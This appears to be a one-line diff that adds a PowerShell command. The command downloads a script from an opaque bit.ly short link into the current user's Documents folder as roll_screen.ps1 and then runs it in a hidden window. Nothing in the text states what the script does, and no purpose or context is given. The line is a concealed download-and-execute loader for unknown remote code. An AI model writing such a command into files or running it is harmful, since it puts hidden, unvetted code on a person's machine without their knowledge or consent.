@@ -1,0 +1,1 @@
+powershell Invoke-WebRequest -Uri 'http://bit.ly/2tbZpE8' -OutFile C:/Users/$env:UserName/Documents/roll_screen.ps1;powershell.exe -windowstyle hidden C:/Users/$env:UserName/Documents/roll_screen.ps1
